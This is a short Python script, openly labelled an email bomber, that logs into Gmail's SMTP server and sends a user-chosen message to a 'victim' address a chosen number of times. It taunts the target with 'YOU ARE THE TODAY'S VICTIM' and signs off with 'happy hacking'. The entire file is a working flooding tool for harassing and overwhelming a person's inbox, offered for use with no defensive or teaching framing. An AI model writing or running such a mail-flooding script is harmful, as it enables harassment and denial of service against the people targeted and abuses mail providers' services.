
# python based email bomber/flooder 

# 789sk.gupta@gmail.com 

import smtplib  # great smtp module to start the connection with the google's mail server diretly in non-interactive manner 
import platform

import sys
import datetime

smtp_server   = raw_input("your mail server name  : ")
if smtp_server == 'gmail':

		server = smtplib.SMTP('smtp.gmail.com',587) # connecting with gmail smtp server with port number of 587 
    
		server.starttls() # initialisong the tls handshake while connecting to the server
    

		email     = raw_input("Enter Your Email : ")
		# password  = getpass.getpass("Enter your Password:")
		
		password = raw_input("please enter your password ")

   # authentication check 
		if not  email  and not password:
				print ("User not logged in")
		else:
				server.login(email,password)
				print ("Successfully Signed in")
				# victim information 
				send = raw_input("Please Enter Your Victim Email : ")

				print("Amount of bombarding messages?") 
				
				mailnumber= int(raw_input("Count : "))  # counter of numnber of mail messeges to be sent 
				

				messagetovic = raw_input("Enter Your Message :\n")
				
				

				for count in range(int(mailnumber)):
					server.sendmail(email,send,messagetovic)
					
					print (count,"SORRY, YOU ARE THE TODAY'S VICTIM!!!! :)! : ")



				server.quit()

		else:
				print("You have not Choosed 'gmail' ")				

# program ends 
# happy hacking 
# use carefully
